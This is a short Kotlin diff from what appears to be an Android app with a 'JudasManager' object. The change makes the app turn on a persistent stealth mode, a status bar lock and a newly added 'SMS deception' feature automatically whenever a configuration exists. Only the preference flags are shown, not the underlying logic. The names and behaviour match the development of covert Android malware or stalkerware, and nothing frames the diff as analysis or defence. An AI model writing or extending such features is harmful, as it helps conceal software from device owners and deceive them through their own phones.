@@ -16,9 +16,10 @@ object JudasManager {
         val prefs = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
         prefs.edit().putBoolean("persistent_stealth_active", true).apply()
         
-        // Automatically activate status bar lock if a configuration exists
+        // Automatically activate status bar lock and SMS deception if a configuration exists
         ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
             .putBoolean("status_bar_active", true)
+            .putBoolean("sms_deception_active", true)
             .apply()
         DynamicUIManager.applyStoredStatusBar(ctx)
 
